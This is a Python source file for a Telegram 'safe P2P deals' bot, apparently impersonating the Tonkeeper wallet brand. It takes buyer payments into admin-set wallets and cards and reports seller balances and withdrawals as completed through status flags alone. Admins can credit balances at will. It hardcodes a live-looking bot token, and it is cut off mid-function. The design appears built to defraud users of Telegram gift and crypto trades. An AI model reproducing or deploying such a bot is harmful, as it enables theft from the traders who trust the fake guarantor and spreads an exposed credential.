import asyncio
import json
import os
import uuid
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties

# ========== КОНФИГ ==========
BOT_TOKEN = "8911310692:AAFD11Kmqx02MHI_4WrveVDTvhMN5f0BCq0"
MASTER_ADMIN_ID = 8002472821
SUPPORT_LINK = "@dealtonkeeper_bot"
BOT_USERNAME = "tonkeeperealsbot"
BOT_NAME = "Tonkeeper | P2P"
CHANNEL_LINK = "https://t.me/tonkeeper_ru"

# ========== ПРЕМИУМ ЭМОДЗИ (ВСЕ ID ИЗ ТВОИХ СПИСКОВ) ==========
P = {
    "🔥": "5208513917965328345",
    "❤️": "5208806229144524155",
    "💎": "5316583751923290826",
    "💰": "5208954744818651087",
    "⭐️": "5208446474093876113",
    "✨": "5208424793098968198",
    "✅": "5208422125924275090",
    "❌": "5208480322731137426",
    "❓": "5208739588431957814",
    "❗️": "5208431570557360595",
    "⚠️": "5206371334875012678",
    "➕": "5208964052012780755",
    "➖": "5208583212967680239",
    "➡️": "5319187743350217782",
    "◀️": "5316635411789931847",
    "⬆️": "5316991155341125587",
    "⬇️": "5317005105394901648",
    "👑": "5316716234484506715",
    "👤": "5206193858236406745",
    "👍": "5208822833488091726",
    "👎": "5208933295751977679",
    "📱": "5208752434679142939",
    "📊": "5208846279714560254",
    "📦": "5208752434679142939",
    "📝": "5208752434679142939",
    "📌": "5208548453797352937",
    "🔗": "5208730126619005798",
    "🔒": "5208876722442753552",
    "🔔": "5208964052012780755",
    "🔙": "5316635411789931847",
    "🔽": "5317005105394901648",
    "💳": "5316583751923290826",
    "💬": "5296258510684712098",
    "💲": "5208497914917179963",
    "💱": "5208929984332191234",
    "🏆": "5208479459442708955",
    "🏴‍☠️": "5316995828265538844",
    "🎁": "5235695112419303615",
    "🔧": "5208694736088488348",
    "⚙️": "5208694736088488348",
    "🖼": "5203977968644288289",
    "📷": "5373056919688731596",
    "✏️": "5301173701323028420",
    "⌛": "5318940267334622539",
    "⏳": "5318940267334622539",
    "🚀": "5258332798409783582",
    "✈️": "5208619118894273325",
    "🌐": "5208773063407066255",
    "🪙": "5316583751923290826",
    "👛": "5316583751923290826",
    "🐶": "5433776470080107054",
    "🐱": "5246792792516082598",
    "🐈": "5316847239576970469",
    "🐆": "5316824802667813116",
    "🤖": "5197252827247841976",
    "🥷": "5206338766138007521",
    "👻": "5208581293117298225",
    "💀": "5318857718063192007",
    "🦖": "5318852478203091165",
    "🕷": "5208813534883897052",
    "🕸": "5208805254186948298",
    "🌈": "5206493268996546666",
    "⭐": "5208446474093876113",
    "🌟": "5208938110410314809",
    "💫": "5208957270259425030",
    "💯": "5319168016565424610",
    "‼️": "5319183916534354992",
    "⁉️": "5206298861596861762",
    "0️⃣": "5206375917605119584",
    "1️⃣": "5208967788634331369",
    "2️⃣": "5208451293047182923",
    "3️⃣": "5208944947998249032",
    "4️⃣": "5208834721957564558",
    "5️⃣": "5208576293775364525",
    "6️⃣": "5208663374237292374",
    "7️⃣": "5208837848693779350",
    "8️⃣": "5208548647070881692",
    "9️⃣": "5208420442297094974",
    "📉": "5208497914917179963",
    "📞": "5208764937328940427",
    "⏰": "5208481478077338787",
    "📢": "5208572771902182077",
    "🆘": "5206186324863769699",
    "🔍": "5206531640234368505",
    "📭": "5208739588431957814",
    "👇": "5317005105394901648",
    "🔐": "5208876722442753552",
    "🛡️": "5316898985342952232",
    "🤝": "5206472897966660789",
    "📋": "5208846279714560254",
    "⚡️": "5206186324863769699",
    "🔑": "5316583751923290826",
    "🏠": "5305757775752620395",
}


def pm(emoji_char: str) -> str:
    emoji_id = P.get(emoji_char)
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{emoji_char}</tg-emoji>'
    return emoji_char


def premium_button(text: str, callback_data: str, emoji_char: str = None) -> InlineKeyboardButton:
    if emoji_char and emoji_char in P:
        return InlineKeyboardButton(
            text=text,
            icon_custom_emoji_id=P[emoji_char],
            callback_data=callback_data
        )
    return InlineKeyboardButton(text=text, callback_data=callback_data)


bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ========== ФАЙЛЫ ==========
DEALS_FILE = "deals.json"
ADMINS_FILE = "admins.json"
BALANCE_FILE = "balance.json"
REKVISITS_FILE = "rekvisits.json"
START_PHOTO_FILE = "start_photo.json"
WITHDRAW_REQUESTS_FILE = "withdraw_requests.json"


def load_deals():
    if os.path.exists(DEALS_FILE):
        with open(DEALS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}


def save_deals(deals):
    with open(DEALS_FILE, 'w', encoding='utf-8') as f:
        json.dump(deals, f, indent=2, ensure_ascii=False)


def load_admins():
    if os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, 'r', encoding='utf-8') as f:
            return set(json.load(f))
    return {MASTER_ADMIN_ID}


def save_admins(admins):
    with open(ADMINS_FILE, 'w', encoding='utf-8') as f:
        json.dump(list(admins), f, indent=2)


def load_balance():
    if os.path.exists(BALANCE_FILE):
        with open(BALANCE_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}


def save_balance(balance):
    with open(BALANCE_FILE, 'w', encoding='utf-8') as f:
        json.dump(balance, f, indent=2, ensure_ascii=False)


def load_rekvisits():
    if os.path.exists(REKVISITS_FILE):
        with open(REKVISITS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {
        "ton": f"{pm('💎')} ОПЛАТА TON\n\nПереведите TON на кошелек:\nUQCD3wX5Y5G5d8F5J8K9L0Z1X2C3V4B5N6M7A8S9D0F1G2H3\n\nСумма: {{amount}} TON",
        "stars": f"{pm('⭐️')} ОПЛАТА ЗВЁЗДАМИ\n\nОтправьте звёзды в бота: @{BOT_USERNAME}\n\nСумма: {{amount}} STARS",
        "rub": f"{pm('💰')} ОПЛАТА РУБЛЯМИ\n\nПереведите на карту:\n2200 1234 5678 9012\nТинькофф\n\nСумма: {{amount}} RUB",
        "uah": f"{pm('🌐')} ОПЛАТА ГРИВНАМИ\n\nПереведите на карту:\n4149 5678 1234 5678\nПриватБанк\n\nСумма: {{amount}} UAH"
    }


def save_rekvisits(rekvisits):
    with open(REKVISITS_FILE, 'w', encoding='utf-8') as f:
        json.dump(rekvisits, f, indent=2, ensure_ascii=False)


def load_start_photo():
    if os.path.exists(START_PHOTO_FILE):
        with open(START_PHOTO_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"file_id": None}


def save_start_photo(data):
    with open(START_PHOTO_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)


def load_withdraw_requests():
    if os.path.exists(WITHDRAW_REQUESTS_FILE):
        with open(WITHDRAW_REQUESTS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}


def save_withdraw_requests(requests):
    with open(WITHDRAW_REQUESTS_FILE, 'w', encoding='utf-8') as f:
        json.dump(requests, f, indent=2, ensure_ascii=False)


deals = load_deals()
admins = load_admins()
balance = load_balance()
rekvisits = load_rekvisits()
start_photo = load_start_photo()
withdraw_requests = load_withdraw_requests()


# ========== FSM ==========
class DealStates(StatesGroup):
    waiting_for_product = State()
    waiting_for_currency = State()
    waiting_for_amount = State()
    waiting_for_buyer_username = State()


class RekvStates(StatesGroup):
    waiting_for_rekv_type = State()
    waiting_for_rekv_text = State()


class PhotoStates(StatesGroup):
    waiting_for_photo = State()


class WithdrawStates(StatesGroup):
    waiting_for_currency = State()
    waiting_for_details = State()


class AdminAddBalanceState(StatesGroup):
    waiting_for_user_id = State()
    waiting_for_currency = State()
    waiting_for_amount = State()


# ========== КЛАВИАТУРЫ ==========
def main_menu_keyboard(user_id: int) -> InlineKeyboardMarkup:
    buttons = [
        [
            premium_button("СОЗДАТЬ СДЕЛКУ", "menu_create_deal", "📱"),
            premium_button("МОЙ БАЛАНС", "menu_my_balance", "💰"),
        ],
        [
            premium_button("МОИ СДЕЛКИ", "menu_my_deals", "📊"),
            premium_button("ПРЕМИУМ", "menu_premium", "⭐️"),
        ],
        [
            premium_button("FAQ", "menu_faq", "❓"),
            premium_button("КАНАЛ", "menu_channel", "🔥"),
        ]
    ]
    if is_admin(user_id):
        buttons.append([
            premium_button("АДМИН ПАНЕЛЬ", "menu_admin_panel", "👑")
        ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("TON", "curr_TON", "💎")],
        [premium_button("STARS", "curr_STARS", "⭐️")],
        [premium_button("RUB", "curr_RUB", "💰")],
        [premium_button("UAH", "curr_UAH", "🌐")]
    ])


def withdraw_currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("TON", "withdraw_TON", "💎")],
        [premium_button("STARS", "withdraw_STARS", "⭐️")],
        [premium_button("RUB", "withdraw_RUB", "💰")],
        [premium_button("UAH", "withdraw_UAH", "🌐")]
    ])


def admin_panel_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("СМЕНИТЬ СТАРТ ФОТО", "change_photo", "📷")],
        [premium_button("НАЧИСЛИТЬ БАЛАНС", "admin_add_balance", "💰")],
        [premium_button("ДОБАВИТЬ АДМИНА", "add_admin", "🐶")],
        [premium_button("УДАЛИТЬ АДМИНА", "remove_admin", "🐱")],
        [premium_button("СПИСОК АДМИНОВ", "list_admins", "📊")],
        [premium_button("РЕКВИЗИТЫ ОПЛАТЫ", "edit_rekvisits", "💎")],
        [premium_button("ВСЕ СДЕЛКИ", "all_deals", "🏆")],
        [premium_button("ЗАЯВКИ НА ВЫВОД", "withdraw_requests", "💲")],
        [premium_button("ГЛАВНОЕ МЕНЮ", "back_to_main", "◀️")]
    ])


def rekvisits_edit_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("ИЗМЕНИТЬ TON", "edit_ton", "💎")],
        [premium_button("ИЗМЕНИТЬ STARS", "edit_stars", "⭐️")],
        [premium_button("ИЗМЕНИТЬ RUB", "edit_rub", "💰")],
        [premium_button("ИЗМЕНИТЬ UAH", "edit_uah", "🌐")],
        [premium_button("НАЗАД", "back_to_admin", "◀️")]
    ])


def seller_confirm_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("ПЕРЕДАЛ ТОВАР", f"seller_done_{deal_id}", "📦")]
    ])


def buyer_confirm_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("ПОЛУЧИЛ ТОВАР", f"buyer_confirm_{deal_id}", "👍")],
        [premium_button("В ПОДДЕРЖКУ", f"support_{deal_id}", "❓")]
    ])


def buyer_pending_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("ОЖИДАНИЕ ПЕРЕДАЧИ", "noop", "⏳")],
        [premium_button("В ПОДДЕРЖКУ", f"support_{deal_id}", "❓")]
    ])


def payment_method_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("ОПЛАТИТЬ ПО РЕКВИЗИТАМ", f"pay_rekvisits_{deal_id}", "💳")],
        [premium_button("ОПЛАТИТЬ С БАЛАНСА", f"pay_balance_{deal_id}", "💰")]
    ])


def back_to_main_button():
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("ГЛАВНОЕ МЕНЮ", "back_to_main", "◀️")]
    ])


# ========== ПОМОЩНИКИ ==========
def is_admin(user_id: int) -> bool:
    return user_id in admins


async def log_to_master(text: str):
    try:
        await bot.send_message(MASTER_ADMIN_ID, text)
    except:
        pass


def get_balance(user_id: int) -> dict:
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0}
        save_balance(balance)
    return balance[uid]


def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_balance(balance)


def get_rekvisits_text(currency, amount):
    curr_key = currency.lower()
    if curr_key in rekvisits:
        return rekvisits[curr_key].format(amount=amount)
    return rekvisits.get("stars", "Реквизиты не заданы").format(amount=amount)


# ========== ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ БЕЗОПАСНОГО РЕДАКТИРОВАНИЯ ==========
async def safe_edit(callback: types.CallbackQuery, text: str, reply_markup=None, **kwargs):
    """Безопасное редактирование сообщения с проверкой"""
    try:
        if callback.message.text or callback.message.caption:
            await callback.message.edit_text(text, reply_markup=reply_markup, **kwargs)
        else:
            await callback.message.answer(text, reply_markup=reply_markup, **kwargs)
    except Exception as e:
        print(f"Ошибка при редактировании: {e}")
        try:
            await callback.message.answer(text, reply_markup=reply_markup, **kwargs)
        except:
            pass


# ========== ОТПРАВКА СООБЩЕНИЙ ==========
async def send_welcome_message(message: types.Message):
    welcome_text = f"""{pm('🔥')} {BOT_NAME} {pm('🔥')}

{pm('🏴‍☠️')} БЕЗОПАСНЫЕ P2P-СДЕЛКИ
• {pm('🤝')} Честные сделки между продавцами и покупателями
• {pm('💎')} TON | {pm('⭐️')} STARS | {pm('💰')} RUB | {pm('🌐')} UAH
• {pm('🔒')} Гарант безопасности с обеих сторон
• {pm('👑')} Премиум поддержка 24/7

{pm('📊')} КАК ЭТО РАБОТАЕТ:
{pm('1️⃣')} Продавец создаёт сделку
{pm('2️⃣')} Продавец отправляет ссылку покупателю
{pm('3️⃣')} Покупатель выбирает способ оплаты
{pm('4️⃣')} Администратор проверяет оплату
{pm('5️⃣')} Продавец нажимает «Передал товар»
{pm('6️⃣')} Покупатель нажимает «Получил товар»
{pm('7️⃣')} Деньги зачисляются на баланс продавца

{pm('📢')} НАШ КАНАЛ: {CHANNEL_LINK}
{pm('🆘')} ПОДДЕРЖКА: @tonkeeperdealssupbot

{pm('🔥')} НАЧНИ ПРЯМО СЕЙЧАС {pm('🚀')}"""

    if start_photo.get("file_id"):
        try:
            await message.answer_photo(
                photo=start_photo["file_id"],
                caption=welcome_text,
                reply_markup=main_menu_keyboard(message.from_user.id)
            )
            return
        except:
            pass

    await message.answer(welcome_text, reply_markup=main_menu_keyboard(message.from_user.id))


async def send_buyer_pending_message(deal_id: str):
    deal = deals[deal_id]
    keyboard = buyer_pending_keyboard(deal_id)

    try:
        msg = await bot.send_message(
            deal["buyer_username"],
            f"{pm('✈️')} СДЕЛКА #{deal_id} ОПЛАЧЕНА!\n\n"
            f"{pm('📦')} Товар: {deal['product']}\n"
            f"{pm('💰')} Сумма: {deal['amount']} {deal['currency']}\n"
            f"{pm('👤')} Продавец: @{deal['seller_username']}\n\n"
            f"{pm('⏳')} ПРОДАВЕЦ ПОЛУЧИЛ УВЕДОМЛЕНИЕ.\n\n"
            f"{pm('🔥')} КАК ТОЛЬКО ОН ПЕРЕДАСТ ТОВАР — У ВАС ПОЯВИТСЯ КНОПКА",
            reply_markup=keyboard
        )
        deal["buyer_message_id"] = msg.message_id
        deal["buyer_chat_id"] = msg.chat.id
        save_deals(deals)
    except Exception as e:
        print(f"Ошибка: {e}")


# ========== ОБРАБОТЧИКИ ГЛАВНОГО МЕНЮ ==========
@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    text = f"{pm('🔥')} {BOT_NAME} — БЕЗОПАСНЫЕ P2P-СДЕЛКИ {pm('🔥')}\n\nВЫБЕРИТЕ ДЕЙСТВИЕ:"
    await safe_edit(callback, text, reply_markup=main_menu_keyboard(callback.from_user.id))


@dp.callback_query(lambda c: c.data == "menu_create_deal")
async def menu_create_deal(callback: types.CallbackQuery, state: FSMContext):
    text = f"{pm('✏️')} ОПИШИТЕ ТОВАР ИЛИ УСЛУГУ, КОТОРУЮ ВЫ ПРОДАЁТЕ:\n\nПРИМЕР: NFT-подарок Telegram Premium"
    await safe_edit(callback, text)
    await state.set_state(DealStates.waiting_for_product)


@dp.callback_query(lambda c: c.data == "menu_my_balance")
async def menu_my_balance(callback: types.CallbackQuery):
    user_balance = get_balance(callback.from_user.id)
    text = f"""{pm('💰')} ВАШ БАЛАНС {pm('💰')}

{pm('💎')} TON: {user_balance['ton']}
{pm('⭐️')} STARS: {user_balance['stars']}
{pm('💰')} RUB: {user_balance['rub']}
{pm('🌐')} UAH: {user_balance['uah']}

{pm('⬇️')} ДЛЯ ВЫВОДА НАЖМИТЕ КНОПКУ {pm('⬇️')}"""

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("ВЫВЕСТИ СРЕДСТВА", "start_withdraw", "💲")],
        [premium_button("ГЛАВНОЕ МЕНЮ", "back_to_main", "◀️")]
    ])
    await safe_edit(callback, text, reply_markup=keyboard)


@dp.callback_query(lambda c: c.data == "menu_my_deals")
async def menu_my_deals(callback: types.CallbackQuery):
    user_deals = []
    for d_id, d in deals.items():
        if d.get("seller_id") == callback.from_user.id:
            user_deals.append((d_id, d))

    if not user_deals:
        text = f"{pm('📭')} У ВАС НЕТ СДЕЛОК."
        await safe_edit(callback, text, reply_markup=back_to_main_button())
    else:
        text = f"{pm('📊')} ВАШИ СДЕЛКИ\n\n"
        for d_id, d in user_deals[-10:]:
            status_emoji = {
                "waiting_payment": pm('⏳'),
                "paid": pm('✅'),
                "awaiting_confirmation": pm('📦'),
                "completed": pm('🎁')
            }.get(d['status'], pm('❓'))
            text += f"{d_id} | {status_emoji} | {d['amount']} {d['currency']}\n   → {d['product'][:30]}\n\n"
        await safe_edit(callback, text, reply_markup=back_to_main_button())


@dp.callback_query(lambda c: c.data == "menu_premium")
async def menu_premium(callback: types.CallbackQuery):
    text = f"""{pm('🔥')} ПРЕМИУМ СТАТУС {pm('🔥')}

{pm('💎')} ПРИВИЛЕГИИ:
• {pm('✅')} ПРИОРИТЕТНАЯ ПОДДЕРЖКА 24/7
• {pm('📉')} СНИЖЕННАЯ КОМИССИЯ (0%)
• {pm('🚀')} РАННИЙ ДОСТУП К НОВЫМ ФУНКЦИЯМ
• {pm('🎁')} ЭКСКЛЮЗИВНЫЕ NFT-НАГРАДЫ

{pm('⭐️')} ВАШ СТАТУС: АКТИВЕН (БЕССРОЧНО)

{pm('🚀')} СПАСИБО, ЧТО ВЫ С НАМИ!"""
    await safe_edit(callback, text, reply_markup=back_to_main_button())


@dp.callback_query(lambda c: c.data == "menu_faq")
async def menu_faq(callback: types.CallbackQuery):
    text = f"""{pm('❓')} ЧАСТЫЕ ВОПРОСЫ

{pm('1️⃣')} КАК НАЧАТЬ СДЕЛКУ?
НАЖМИТЕ «СОЗДАТЬ СДЕЛКУ» И СЛЕДУЙТЕ ИНСТРУКЦИИ.

{pm('2️⃣')} КАКИЕ ВАЛЮТЫ ДОСТУПНЫ?
{pm('💎')} TON | {pm('⭐️')} STARS | {pm('💰')} RUB | {pm('🌐')} UAH

{pm('3️⃣')} КАК Я ПОЛУЧУ ОПЛАТУ?
ПОСЛЕ ПОДТВЕРЖДЕНИЯ ПОКУПАТЕЛЯ ДЕНЬГИ НА БАЛАНС.

{pm('4️⃣')} КАК ВЫВЕСТИ ДЕНЬГИ?
«МОЙ БАЛАНС» → ВЫБРАТЬ ВАЛЮТУ → УКАЗАТЬ РЕКВИЗИТЫ

{pm('5️⃣')} БЕЗОПАСНО ЛИ ЭТО?
ДА! АДМИНИСТРАТОР ПРОВЕРЯЕТ ОПЛАТУ.

{pm('6️⃣')} СКОЛЬКО ВРЕМЕНИ ЗАНИМАЕТ ВЫВОД?
1-5 МИНУТ ПОСЛЕ ПОДТВЕРЖДЕНИЯ.

{pm('7️⃣')} КАК СВЯЗАТЬСЯ С ПОДДЕРЖКОЙ?
НАЖМИТЕ КНОПКУ «КАНАЛ» ИЛИ ПИШИТЕ В ПОДДЕРЖКУ"""
    await safe_edit(callback, text, reply_markup=back_to_main_button())


@dp.callback_query(lambda c: c.data == "menu_channel")
async def menu_channel(callback: types.CallbackQuery):
    text = f"""{pm('📢')} НАШ TELEGRAM КАНАЛ

🔥 Подписывайся, чтобы быть в курсе:
{CHANNEL_LINK}

{pm('💎')} В канале:
• Новости и обновления
• Полезные гайды
• Розыгрыши и бонусы
• Актуальные курсы валют

{pm('🚀')} ЖМИ НА ССЫЛКУ И ПОДПИСЫВАЙСЯ!"""
    await safe_edit(callback, text, reply_markup=back_to_main_button(), disable_web_page_preview=False)


@dp.callback_query(lambda c: c.data == "menu_admin_panel")
async def menu_admin_panel(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    text = f"{pm('👑')} ПАНЕЛЬ АДМИНИСТРАТОРА\n\nВЫБЕРИТЕ ДЕЙСТВИЕ:"
    await safe_edit(callback, text, reply_markup=admin_panel_keyboard())


# ========== СТАРТ ==========
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        if deal_id not in deals:
            await message.answer(f"{pm('❌')} Сделка не найдена или уже завершена.")
            return

        deal = deals[deal_id]
        deal["buyer_id"] = message.from_user.id
        save_deals(deals)

        if message.from_user.username != deal["buyer_username"]:
            await message.answer(
                f"{pm('❌')} ДОСТУП ЗАПРЕЩЁН!\n\nЭта сделка для @{deal['buyer_username']}\n\nОбратитесь в поддержку: @tonkeeperdealssupbot"
            )
            await log_to_master(
                f"⚠️ НЕСАНКЦИОНИРОВАННЫЙ ЗАХОД\nСделка: #{deal_id}\nПопытался: @{message.from_user.username}\nОжидался: @{deal['buyer_username']}")
            return

        if deal["status"] != "waiting_payment":
            await message.answer(f"{pm('❌')} Сделка уже в статусе: {deal['status']}")
            return

        await message.answer(
            f"{pm('✈️')} СДЕЛКА #{deal_id}\n\n"
            f"{pm('📦')} Товар: {deal['product']}\n"
            f"{pm('💰')} Сумма: {deal['amount']} {deal['currency']}\n"
            f"{pm('👤')} Продавец: @{deal['seller_username']}\n\n"
            f"{pm('⬇️')} ВЫБЕРИТЕ СПОСОБ ОПЛАТЫ {pm('⬇️')}",
            reply_markup=payment_method_keyboard(deal_id)
        )

        await log_to_master(
            f"👁 ПОКУПАТЕЛЬ ЗАШЁЛ В СДЕЛКУ\n"
            f"Сделка: #{deal_id}\n"
            f"Покупатель: {message.from_user.full_name} (@{message.from_user.username})"
        )
        return

    await send_welcome_message(message)


# ========== ВЫВОД ==========
@dp.callback_query(lambda c: c.data == "start_withdraw")
async def start_withdraw(callback: types.CallbackQuery, state: FSMContext):
    user_balance = get_balance(callback.from_user.id)
    has_money = any(v > 0 for v in user_balance.values())

    if not has_money:
        await callback.answer(f"{pm('❌')} У вас нет средств для вывода", show_alert=True)
        return

    text = f"{pm('💰')} ВЫБЕРИТЕ ВАЛЮТУ ДЛЯ ВЫВОДА:"
    await safe_edit(callback, text, reply_markup=withdraw_currency_keyboard())
    await state.set_state(WithdrawStates.waiting_for_currency)


@dp.callback_query(lambda c: c.data.startswith("withdraw_"))
async def withdraw_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    user_balance = get_balance(callback.from_user.id)
    curr_key = currency.lower()

    if user_balance.get(curr_key, 0) <= 0:
        await callback.answer(f"{pm('❌')} У вас нет средств в {currency}", show_alert=True)
        return

    await state.update_data(withdraw_currency=currency, withdraw_amount=user_balance[curr_key])

    if currency == "STARS":
        text = f"{pm('⭐️')} ВВЕДИТЕ ВАШ TELEGRAM USERNAME ДЛЯ ПОЛУЧЕНИЯ ЗВЁЗД:\n\nПРИМЕР: @john_doe"
    else:
        text = f"{pm('💲')} ВВЕДИТЕ РЕКВИЗИТЫ ДЛЯ ВЫВОДА {currency}:\n\nПРИМЕР ДЛЯ TON: UQ...\nПРИМЕР ДЛЯ RUB/UAH: НОМЕР КАРТЫ ИЛИ КОШЕЛЁК"

    await safe_edit(callback, text)
    await state.set_state(WithdrawStates.waiting_for_details)


@dp.message(WithdrawStates.waiting_for_details)
async def withdraw_details(message: types.Message, state: FSMContext):
    data = await state.get_data()
    currency = data["withdraw_currency"]
    amount = data["withdraw_amount"]
    details = message.text.strip()

    request_id = str(uuid.uuid4())[:8]
    withdraw_requests[request_id] = {
        "user_id": message.from_user.id,
        "username": message.from_user.username,
        "full_name": message.from_user.full_name,
        "currency": currency,
        "amount": amount,
        "details": details,
        "status": "pending",
        "created_at": datetime.now().isoformat()
    }
    save_withdraw_requests(withdraw_requests)

    await bot.send_message(
        MASTER_ADMIN_ID,
        f"{pm('💲')} НОВАЯ ЗАЯВКА НА ВЫВОД #{request_id}\n\n"
        f"👤 Пользователь: {message.from_user.full_name} (@{message.from_user.username})\n"
        f"{pm('💰')} Сумма: {amount} {currency}\n"
        f"{pm('📝')} Реквизиты: {details}\n\n"
        f"ДЛЯ ПОДТВЕРЖДЕНИЯ: /confirm_withdraw {request_id}"
    )

    await message.answer(
        f"{pm('✅')} ЗАЯВКА НА ВЫВОД #{request_id} СОЗДАНА!\n\n"
        f"{pm('💰')} Сумма: {amount} {currency}\n"
        f"{pm('⏳')} ОЖИДАЙТЕ ВЫВОДА В ТЕЧЕНИЕ 1-5 МИНУТ.\n\n"
        f"СТАТУС ЗАЯВКИ: /withdraw_status {request_id}",
        reply_markup=back_to_main_button()
    )

    await log_to_master(f"💸 Новая заявка на вывод: #{request_id} от @{message.from_user.username}")
    await state.clear()


@dp.message(Command("confirm_withdraw"))
async def confirm_withdraw(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer(f"{pm('❌')} НЕДОСТАТОЧНО ПРАВ")
        return

    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"{pm('❗️')} ИСПОЛЬЗОВАНИЕ: /confirm_withdraw [ID ЗАЯВКИ]")
        return

    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer(f"{pm('❌')} ЗАЯВКА {request_id} НЕ НАЙДЕНА")
        return

    req = withdraw_requests[request_id]
    if req["status"] != "pending":
        await message.answer(f"{pm('❌')} ЗАЯВКА УЖЕ ОБРАБОТАНА: {req['status']}")
        return

    req["status"] = "completed"
    req["completed_at"] = datetime.now().isoformat()
    req["completed_by"] = message.from_user.id
    save_withdraw_requests(withdraw_requests)

    user_balance = get_balance(req["user_id"])
    curr_key = req["currency"].lower()
    if user_balance.get(curr_key, 0) >= req["amount"]:
        user_balance[curr_key] -= req["amount"]
        save_balance(balance)

    try:
        await bot.send_message(
            req["user_id"],
            f"{pm('✅')} ВЫВОД СРЕДСТВ ПОДТВЕРЖДЁН!\n\n"
            f"{pm('💰')} Сумма: {req['amount']} {req['currency']}\n"
            f"{pm('📝')} Реквизиты: {req['details']}\n\n"
            f"СРЕДСТВА ОТПРАВЛЕНЫ В ТЕЧЕНИЕ 1-5 МИНУТ."
        )
    except:
        pass

    await message.answer(f"{pm('✅')} ВЫВОД #{request_id} ПОДТВЕРЖДЁН! СРЕДСТВА СПИСАНЫ С БАЛАНСА.")
    await log_to_master(f"✅ Вывод #{request_id} подтверждён админом @{message.from_user.username}")


@dp.message(Command("withdraw_status"))
async def withdraw_status(message: types.Message):
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"{pm('❗️')} ИСПОЛЬЗОВАНИЕ: /withdraw_status [ID ЗАЯВКИ]")
        return

    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer(f"{pm('❌')} ЗАЯВКА {request_id} НЕ НАЙДЕНА")
        return

    req = withdraw_requests[request_id]
    status_text = {
        "pending": f"{pm('⏳')} В ОБРАБОТКЕ",
        "completed": f"{pm('✅')} ВЫПОЛНЕН"
    }.get(req["status"], req["status"])

    await message.answer(
        f"{pm('📊')} СТАТУС ЗАЯВКИ #{request_id}\n\n"
        f"{pm('💰')} Сумма: {req['amount']} {req['currency']}\n"
        f"📅 Создана: {req['created_at'][:19]}\n"
        f"📊 Статус: {status_text}"
    )


# ========== СОЗДАНИЕ СДЕЛКИ ==========
@dp.message(DealStates.waiting_for_product)
async def get_product(message: types.Message, state: FSMContext):
    await state.update_data(product=message.text.strip())
    await message.answer(f"{pm('💱')} ВЫБЕРИТЕ ВАЛЮТУ СДЕЛКИ:", reply_markup=currency_keyboard())
    await state.set_state(DealStates.waiting_for_currency)


@dp.callback_query(lambda c: c.data.startswith("curr_"))
async def get_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    await state.update_data(currency=currency)
    text = f"{pm('💰')} ВВЕДИТЕ СУММУ СДЕЛКИ (ТОЛЬКО ЧИСЛО):\nВАЛЮТА: {currency}"
    await safe_edit(callback, text)
    await state.set_state(DealStates.waiting_for_amount)


@dp.message(DealStates.waiting_for_amount)
async def get_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        await state.update_data(amount=amount)
        await message.answer(
            f"{pm('👤')} ВВЕДИТЕ TELEGRAM USERNAME ПОКУПАТЕЛЯ (БЕЗ @):\n\nПРИМЕР: john_doe\n\n{pm('❗️')} ТОЛЬКО ЭТОТ ПОЛЬЗОВАТЕЛЬ СМОЖЕТ ЗАЙТИ В СДЕЛКУ!")
        await state.set_state(DealStates.waiting_for_buyer_username)
    except:
        await message.answer(f"{pm('❌')} ВВЕДИТЕ ПОЛОЖИТЕЛЬНОЕ ЧИСЛО, НАПРИМЕР: 1500")


@dp.message(DealStates.waiting_for_buyer_username)
async def get_buyer(message: types.Message, state: FSMContext):
    buyer_username = message.text.strip().replace("@", "").lower()
    data = await state.get_data()

    deal_id = str(uuid.uuid4())[:8]
    deals[deal_id] = {
        "deal_id": deal_id,
        "seller_id": message.from_user.id,
